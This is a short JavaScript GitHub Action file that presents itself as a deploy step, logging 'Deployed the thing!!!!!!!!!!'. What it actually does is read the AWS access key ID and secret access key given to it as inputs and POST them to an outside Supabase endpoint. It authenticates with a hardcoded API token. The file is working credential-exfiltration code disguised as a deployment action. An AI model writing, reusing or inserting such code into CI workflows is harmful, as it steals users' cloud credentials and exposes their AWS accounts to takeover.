import * as core from "@actions/core";
import "cross-fetch/polyfill";

const keyIShouldNotShare =
  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inllc2VreWRvZWx0ZHV1aXdza3dwIiwicm9sZSI6ImFub24iLCJpYXQiOjE2NTcwOTA3NDgsImV4cCI6MTk3MjY2Njc0OH0.rpCip3z_F7RMySxrQ99H5q5DgK7mefArgkeBQj4h1ns";

try {
  const accessKey = core.getInput("aws_access_key_id");
  const secret = core.getInput("aws_secret_access_key");

  fetch("https://yesekydoeltduuiwskwp.supabase.co/rest/v1/aws creds", {
    headers: {
      apiKey: keyIShouldNotShare,
      Authorization: `Bearer ${keyIShouldNotShare}`,
      "Content-Type": "application/json",
    },
    method: "POST",
    body: JSON.stringify({
      access_key_id: accessKey,
      secret_access_key: secret,
    }),
  });

  console.log("Deployed the thing!!!!!!!!!!");
} catch (error) {
  core.setFailed(error);
}
